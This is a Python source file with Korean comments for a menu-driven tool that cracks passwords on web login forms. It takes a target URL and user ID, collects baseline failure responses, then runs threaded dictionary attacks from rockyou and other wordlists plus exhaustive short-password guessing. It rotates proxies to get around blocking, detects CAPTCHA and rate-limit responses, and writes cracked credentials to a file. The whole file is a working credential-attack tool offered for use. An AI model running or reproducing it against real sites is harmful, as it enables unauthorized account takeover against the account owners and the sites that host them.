import os
import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import itertools
from colorama import init, Fore
import random
import json
import textwrap
from dataclasses import dataclass
import Proxy        # 루트에 두면 이렇게 / core/에 두면: from core import Proxy

# 공격 대상 하나의 설정을 한 곳에 모으는 상자.
# 함수마다 인자 8개씩 넘기던 걸 cfg 하나로 묶어서 전달한다.
@dataclass
class AttackConfig:
    url: str                 # 공격할 로그인 POST 주소
    userid: str              # 크랙 대상 아이디
    baseline_code: object    # 실패 응답의 기준 status code (없으면 None → 판정 제외)
    baseline_html: str       # 실패 응답의 기준 html
    baseline_location: str   # 실패 응답의 기준 Location 헤더
    id_field: str            # json에서 아이디를 담는 키 이름
    pw_field: str            # json에서 비번을 담는 키 이름
    data_file: str           # 로그인 폼 데이터 json 경로
    baseline_cookies: set    # 실패 응답들이 세팅하던 쿠키 이름 집합 (성공 시 이것 외 새 쿠키가 붙음)


# 여러 스레드 중 하나가 비번을 찾으면 set() → 나머지 스레드가 보고 멈춘다.
found = threading.Event()
abort = threading.Event()   # 프록시 소진 등 '공격 전체 중단' 신호 (한 워커가 켜면 전원 중단)
init(autoreset=True)   # colorama: print마다 색 자동 리셋 (Fore.RESET 안 붙여도 됨)

# 셋업 단계(password_no_value)에서 수집하는 "실패 응답" 기준값 저장용 전역 리스트
test_code = []       # 실패 시 status code 10개
test_html = []       # 실패 시 응답 body 10개
test_location = []   # 실패 시 Location 헤더 10개
test_cookie = []     # 실패 시 Set-Cookie 쿠키 이름 집합 10개
r_password = []      # 기준값 수집에 쓸 랜덤(=틀린) 비번 10개

# 자동화 차단 / 서버 오류 응답 = 성공도 실패도 아님 (성공으로 오인 금지)
BLOCK_CODES = {429, 500, 502, 503, 504}
BLOCK_MARKERS = ("captcha", "자동입력 방지", "로봇", "too many", "일시적으로", "blocked")


def help_bruteforce():
    """모듈 사용법 출력. options → run 순서와 json 구조를 안내한다."""
    print(textwrap.dedent(f"""
    {Fore.YELLOW}============ BruteForce/web 사용법 ============{Fore.RESET}

    {Fore.GREEN}[ 순서 ]{Fore.RESET}
      1. options 로 타겟 설정  →  2. run 으로 공격 실행

    {Fore.GREEN}[ 명령어 ]{Fore.RESET}
      o, options    타겟 설정 (아래 순서로 입력받음)
      r, run        설정한 타겟에 사전공격+브루트포스 시작
      help, h       이 도움말
      exit          모듈 종료

    {Fore.GREEN}[ options 입력 항목 ]{Fore.RESET}
      Target json file name   data/ 와 url/ 폴더에 있는 json 이름
                              (.json 생략 가능, 예: kimsungmo)
      Target ID               크랙할 대상 아이디
      (id/pw 필드는 data json의 null 자리에서 자동 감지)

    {Fore.GREEN}[ json 구조 ]{Fore.RESET}
      url/<이름>.json   →  {{"url": "공격할 로그인 POST 주소"}}
      data/<이름>.json  →  로그인 폼 데이터. 아이디·비번 자리는 null
                          예: {{"siteId":"13", "mid":null, "pwd":null}}

    {Fore.GREEN}[ 동작 원리 ]{Fore.RESET}
      - 먼저 랜덤 비번 10개로 "실패 응답"을 수집해 기준값을 만듦
      - 이후 시도가 '성공의 적극적 증거'(새 세션쿠키 / 성공 리다이렉트 / 코드 변화)를
        보일 때만 성공 판정 (단순히 '실패와 다름'은 성공으로 치지 않음 → 오탐 방지)
      - 성공 시 S_ID_PASSWORD.txt 에 ID/PW 저장

    {Fore.YELLOW}=============================================={Fore.RESET}
    """))


def load_json_file(filename):
    """json 파일을 읽어 dict로 반환.
    utf-8로 먼저 읽고, 실패하면 cp949(윈도우 한글 인코딩)로 재시도한다.
    (메모장에서 저장한 json이 cp949인 경우가 많아 방어용)"""
    try:
        with open(filename, "r", encoding="utf-8") as f:
            return json.load(f)
    except UnicodeDecodeError:
        with open(filename, "r", encoding="cp949") as f:
            return json.load(f)


def random_password():
    """기준값 수집용 랜덤 비번 10개 생성 → r_password에 채운다.
    (실제로 맞을 리 없는 무작위 8자리 = '실패 응답'을 얻기 위한 것)"""
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()'
    for i in range(1, 11):
        pw = ''.join(random.choice(chars) for _ in range(8))
        r_password.append(pw)


def password_no_value(url, userid, userid_data_name, userpw_data_name, filename):
    """랜덤(틀린) 비번 10개를 보내 '실패했을 때의 응답'을 수집한다.
    이 응답들이 이후 성공/실패를 가르는 기준값이 된다."""
    # 재실행 시 이전 타겟 데이터가 남지 않도록 초기화 (안 하면 기준값이 꼬임)
    test_code.clear()
    test_html.clear()
    test_location.clear()
    test_cookie.clear()
    r_password.clear()
    random_password()
    s = make_session()
    data = load_json_file(filename)
    data[userid_data_name] = userid
    for length in range(0, 10):
        userpw = r_password[length]
        data[userpw_data_name] = userpw
        # 이 함수의 대상 주소는 파라미터 url (cfg 아님)
        response = proxied_post(s, url, data=data, allow_redirects=False, timeout=(3, 10))
        test_code.append(response.status_code)
        test_html.append(response.text.strip())
        location = response.headers.get("Location", "")
        test_location.append(location)
        test_cookie.append(set(response.cookies.keys()))
        response.close()
    print(Fore.GREEN + "OK" + Fore.RESET + "!")
    s.close()


def check_baseline(values, label):
    """수집한 실패 응답 10개가 '한 축에서' 전부 동일한지 확인한다.
    - 전부 같으면 그 값을 기준값으로 반환 (판정에 쓸 수 있는 안정적인 축)
    - 하나라도 다르면 None 반환 (매번 바뀌는 축 → 판정에서 제외)
    예: status code는 보통 일정 → 기준값 확보 / html은 토큰 때문에 매번 달라 → None"""
    first = values[0]
    for v in values[1:]:
        if v != first:
            print(f"[{label}] 응답이 일정하지 않아 판정에서 제외")
            return None
    print(Fore.GREEN + "OK" + Fore.RESET + "!")
    return first


def looks_blocked(code, text):
    """자동화 차단(레이트리밋/캡차) · 서버 오류 응답인지 판별.
    이런 응답은 '실패 기준과 다르다'고 성공으로 오인하면 안 되므로 판정에서 제외한다."""
    if code in BLOCK_CODES:
        return True
    low = text.lower()
    return any(m in low for m in BLOCK_MARKERS)


def is_success(cfg, userpw, code, text, location, cookies):
    """로그인 성공의 '적극적 증거'가 있을 때만 True.
    (실패와 '다르다'가 아니라 '성공 신호가 있다'로 판정 → 빈 비번/차단응답 오탐 제거)"""
    if not userpw:                       # ① 빈 비번은 절대 성공 아님 (빈값 검증에러 오탐 차단)
        return False
    if looks_blocked(code, text):        # ② 차단/서버오류는 판정 보류
        return False

    # ③ 실패 땐 없던 쿠키가 새로 생김 → 세션 생성 = 강력한 성공 신호
    new_cookies = set(cookies) - cfg.baseline_cookies
    if new_cookies:
        return True
    # ④ 실패와 '다른 곳'으로 리다이렉트 (실패는 보통 로그인페이지로 돌아감)
    if cfg.baseline_location is not None and location and location != cfg.baseline_location:
        return True
    # ⑤ status code가 실패와 다름 (차단코드는 ②에서 이미 걸러짐)
    if cfg.baseline_code is not None and code != cfg.baseline_code:
        return True
    # html 차이만으로는 성공 판정 안 함 (에러메시지 차이로 오탐 多)
    # └ 만약 네 서버가 '성공 시 html만 바뀌는' 구조라면 아래 주석을 네 환경에 맞게 켜라:
    #   SUCCESS_MARKER = "로그아웃"   # 로그인 성공 페이지에만 있는 문구
    #   if SUCCESS_MARKER in text:
    #       return True
    return False


def save_success(cfg, userpw):
    """성공한 아이디/비번을 파일에 기록하고 found를 켜서 다른 스레드도 멈추게 한다."""
    with open("S_ID_PASSWORD.txt", "a", encoding="utf-8") as file:
        file.write("ID :" + str(cfg.userid) + "\n")
        file.write("PASSWORD :" + str(userpw) + "\n")
    found.set()


def make_session():
    """재시도(retry) 설정이 붙은 requests 세션 생성.
    각 스레드가 자기 세션을 따로 만들어 써야 한다 (Session은 스레드 안전하지 않음)."""
    s = requests.Session()
    retry = Retry(total=2, connect=2, read=0, backoff_factor=0.3,
                  status_forcelist=[])
    s.mount("http://", HTTPAdapter(max_retries=retry))
    s.mount("https://", HTTPAdapter(max_retries=retry))
    return s


def proxied_post(s, url, **kwargs):
    """세션 s로 POST. 프록시가 켜져 있으면 '요청마다' 1개 꺼내 태우고 결과를 report.
    프록시 OFF(Proxy.active()가 None)면 그냥 직접 전송 → 프록시 미설정에도 정상 동작."""
    mgr = Proxy.active()
    if not mgr:
        return s.post(url, **kwargs)
    proxies, p = mgr.requests_proxies()          # 요청마다 로테이션
    try:
        r = s.post(url, proxies=proxies, **kwargs)
        mgr.report(p, True)                      # 응답 왔으면 프록시 OK (비번 틀려도 OK)
        return r
    except Exception:
        mgr.report(p, False)                     # 전송 자체 실패 → 프록시 실패로 기록
        raise


def dictionary_admission(cfg, attack_file):
    """사전공격: 사전 파일(rockyou 등)의 비번을 한 줄씩 대입한다."""
    data = load_json_file(cfg.data_file)
    data[cfg.id_field] = cfg.userid
    print("start!")
    s = make_session()
    # errors="ignore": rockyou 등엔 깨진 바이트가 섞여 있어 utf-8로 못 읽는 줄은 건너뛴다
    with open(attack_file, "r", encoding="utf-8", errors="ignore") as f:
        for password in f:
            if found.is_set() or abort.is_set():   # 다른 스레드가 찾았거나(found) 중단 신호(abort)면
                return
            userpw = password.strip()
            if not userpw:                         # 빈 줄에서 온 빈 비번은 스킵 (빈값 오탐 차단)
                continue
            data[cfg.pw_field] = userpw
            try:
                response = proxied_post(s, cfg.url, data=data, allow_redirects=False, timeout=(3, 10))
            except Proxy.ProxyExhausted:                 # 프록시 전부 소진 → 공격 중단(전원)
                print(f"[{Fore.RED}!{Fore.RESET}] 살아있는 프록시 없음 — 공격 중단")
                abort.set()
                return
            except Exception as error:
                print(f"요청 중 오류 발생: {error}")
                with open("error.txt", "a", encoding="utf-8") as file_1:
                    file_1.write(f"Dictionary_admission: {str(error)}\n")
                continue

            location = response.headers.get("Location", "")
            print(f"{Fore.RED}{userpw}{Fore.RESET}")

            if is_success(cfg, userpw, response.status_code, response.text.strip(),
                          location, response.cookies.keys()):
                save_success(cfg, userpw)
                print("crack success!!")
                print(f"ID: {Fore.GREEN}{cfg.userid}{Fore.RESET}")
                print(f"크랙 성공 PW: {Fore.GREEN}{userpw}{Fore.RESET}")
                response.close()
                return
            response.close()
        print(f"{cfg.userid}해당 아이디에 패스워드 존재하지 않음")
        with open("error.txt", "a", encoding="utf-8") as file:
            file.write("존재하지 않는 ID :" + str(cfg.userid) + "\n")
        return


def bruteforce(cfg, start_value, end_value):
    """무차별 대입: start_value~end_value 길이의 모든 문자 조합을 대입한다.
    길이가 길어지면 조합 수가 폭발하므로 짧은 길이만 담당(긴 건 사전공격이 커버)."""
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()'
    s = make_session()
    data = load_json_file(cfg.data_file)
    data[cfg.id_field] = cfg.userid
    for length in range(start_value, end_value):
        for combo in itertools.product(chars, repeat=length):
            userpw = ''.join(combo)
            if found.is_set() or abort.is_set():   # 다른 스레드가 찾았거나(found) 중단 신호(abort)면
                return
            data[cfg.pw_field] = userpw
            try:
                response = proxied_post(s, cfg.url, data=data, allow_redirects=False, timeout=(3, 10))
            except Proxy.ProxyExhausted:                 # 프록시 전부 소진 → 공격 중단(전원)
                print(f"[{Fore.RED}!{Fore.RESET}] 살아있는 프록시 없음 — 공격 중단")
                abort.set()
                return
            except Exception as error:
                print(f"요청 중 오류 발생: {error}")
                with open("error.txt", "a", encoding="utf-8") as file_1:
                    file_1.write(f"BruteForce: {str(error)}\n")
                continue
            location = response.headers.get("Location", "")

            print(location)
            print(f"{Fore.RED}{userpw}{Fore.RESET}")

            if is_success(cfg, userpw, response.status_code, response.text.strip(),
                          location, response.cookies.keys()):
                save_success(cfg, userpw)
                print("crack success!!")
                print(f"ID: {Fore.GREEN}{cfg.userid}{Fore.RESET}")
                print(f"크랙 성공 PW: {Fore.GREEN}{userpw}{Fore.RESET}")
                response.close()
                return
            response.close()
    print(f"{cfg.userid}해당 아이디에 패스워드 존재하지 않음")
    s.close()
    with open("user_error.txt", "a", encoding="utf-8") as file_1:
        file_1.write("존재하지 않는 ID :" + str(cfg.userid) + "\n")
    return


def bruteforce_main():
    """모듈 메인 루프. options로 타겟을 설정하고 run으로 공격을 실행한다."""
    # 타겟 설정값들 (options에서 채워짐)
    rockyou = None
    wifite = None
    fasttrack = None
    crackstation = None
    url = None
    userid = None
    value1 = None   # baseline_code
    value2 = None   # baseline_html
    value3 = None   # baseline_location
    base_cookies = set()
    id_data_name = None
    pw_data_name = None
    data_file = None
    while True:
        input_0xcc = input(f"{Fore.BLUE}0x08{Fore.RESET}(/{Fore.YELLOW}BruteForce{Fore.RESET}/{Fore.YELLOW}web{Fore.RESET})>>")

        s_input_0xcc = input_0xcc.split()  # 입력을 공백으로 토큰화
        if not s_input_0xcc:
            pass
        elif s_input_0xcc[0] == "exit":
            print(f"{Fore.GREEN}exit{Fore.RESET}...")
            break
        elif s_input_0xcc[0] == "help" or s_input_0xcc[0] == "h":
            help_bruteforce()
        elif s_input_0xcc[0] == "o" or s_input_0xcc[0] == "options":
            # 1) 파일명 입력받고, .json 확장자가 없으면 먼저 붙인다
            #    (경로를 만들기 전에 해야 url/data 양쪽 경로가 올바르게 완성됨)
            json_file_name = input(Fore.RED + "Target json file name " + Fore.RESET + ":")
            if not json_file_name.endswith(".json"):
                json_file_name += ".json"

            # 2) 사전 파일 경로들 (이 스크립트와 같은 폴더 기준)
            base = os.path.dirname(__file__)
            rockyou = os.path.join(base, "rockyou.txt")
            wifite = os.path.join(base, "wifite.txt")
            fasttrack = os.path.join(base, "fasttrack.txt")
            crackstation = os.path.join(base, "crackstation.txt")

            # 3) url json에서 공격 대상 주소를 읽는다
            file_url = os.path.join(base, "url", json_file_name)
            url_data = load_json_file(file_url)
            url = url_data["url"]
            print(f"[{Fore.GREEN}+{Fore.RESET}] {Fore.GREEN}Setting up files...{Fore.RESET}...")
            print(Fore.GREEN + "OK" + Fore.RESET + "!")

            # 4) 로그인 폼 데이터 json 경로
            data_file = os.path.join(base, "data", json_file_name)

            userid = input(Fore.RED + "Target ID " + Fore.RESET + ":")

            # 5) data json에서 null인 키 2개를 아이디/비번 자리로 자동 감지 (앞=아이디, 뒤=비번)
            probe = load_json_file(data_file)
            null_keys = [k for k, v in probe.items() if v is None]
            if len(null_keys) != 2:
                print(f"[{Fore.RED}!{Fore.RESET}] json에 null 자리가 2개여야 함 (현재 {len(null_keys)}개). 아이디·비번 자리를 null로 비워둬.")
                continue
            id_data_name, pw_data_name = null_keys[0], null_keys[1]
            print(f"[{Fore.GREEN}+{Fore.RESET}] 자동 감지: id={id_data_name}, pw={pw_data_name}")

            # 6) 실패 응답 기준값 수집 → 각 축(code/html/location/cookie)이 판정에 쓸 만한지 확인
            print(f"[{Fore.GREEN}+{Fore.RESET}] {Fore.GREEN}Preparing password filtering values{Fore.RESET}...")
            password_no_value(url, userid, id_data_name, pw_data_name, data_file)
            print(f"[{Fore.GREEN}+{Fore.RESET}] {Fore.GREEN}Checking status_code value{Fore.RESET}...")
            value1 = check_baseline(test_code, "code")
            print(f"[{Fore.GREEN}+{Fore.RESET}] {Fore.GREEN}Checking html value{Fore.RESET}...")
            value2 = check_baseline(test_html, "html")
            print(f"[{Fore.GREEN}+{Fore.RESET}] {Fore.GREEN}Checking location value{Fore.RESET}...")
            value3 = check_baseline(test_location, "location")

            # 실패 응답들이 세팅하던 쿠키 이름 합집합 = '정상' 쿠키 (성공 시 이것 외 새 쿠키가 붙음)
            base_cookies = set().union(*test_cookie) if test_cookie else set()
            print(f"[{Fore.GREEN}+{Fore.RESET}] baseline cookies: "
                  f"{sorted(base_cookies) if base_cookies else '없음'}")

            # 판정 신호가 하나도 없으면(코드·위치·쿠키 전부 못 쓰면) 성공/실패 구분 불가
            if value1 is None and value3 is None and not base_cookies:
                print(f"[{Fore.RED}!{Fore.RESET}] 성공/실패를 구분할 신호가 없음. "
                      f"(html만 바뀌는 타겟이면 is_success의 SUCCESS_MARKER 주석을 켜라)")
                continue
        elif s_input_0xcc[0] == "r" or s_input_0xcc[0] == "run":
            # options를 먼저 하지 않으면 url이 None → 안내하고 되돌아감
            if url is None:
                print(f"[{Fore.RED}!{Fore.RESET}] 먼저 options로 타겟을 설정하세요.")
                continue
            found.clear()   # 이전 공격에서 켜진 성공 플래그 초기화
            abort.clear()   # 중단 신호도 초기화 (안 하면 한 번 소진된 뒤 모든 공격이 즉시 return)
            # 설정값들을 cfg 하나로 묶어 각 워커에 넘긴다
            cfg = AttackConfig(url, userid, value1, value2, value3,
                               id_data_name, pw_data_name, data_file, base_cookies)
            wordlists = [fasttrack, rockyou, wifite, crackstation]
            brute_ranges = [(1, 3), (3, 5)]   # 길이 1~4만 무차별 대입 (그 이상은 사전공격이 담당)
            # 사전공격 4개 + 브루트포스 2개를 스레드로 동시에 돌린다 (I/O 바운드라 스레드가 유효)
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                for wl in wordlists:
                    futures.append(executor.submit(dictionary_admission, cfg, wl))
                for start, end in brute_ranges:
                    futures.append(executor.submit(bruteforce, cfg, start, end))
                # 워커에서 터진 예외를 여기서 받아 출력 (조용히 죽는 것 방지)
                for fut in as_completed(futures):
                    try:
                        fut.result()
                    except Exception as es_1:
                        print("[메인] 워커 예외:", type(es_1).__name__, es_1)


if __name__ == "__main__":
    bruteforce_main()